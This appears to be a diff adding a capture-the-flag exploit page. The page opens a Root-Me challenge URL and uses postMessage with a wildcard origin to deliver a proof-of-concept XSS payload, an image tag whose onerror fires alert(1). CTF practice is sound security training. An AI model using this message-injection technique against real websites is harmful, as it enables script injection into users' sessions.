@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack Page</title>
+</head>
+<body>
+    <h1>Attack Page</h1>
+    <script>
+        window.onload = function() {
+           
+            const target = window.open('http://node2.challenges.ctf20k.root-me.org:36975/');
+           
+            setTimeout(() => {
+                target.postMessage('{"urgentMessage":"<img src=x onerror=alert(1)>"}', '*');
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
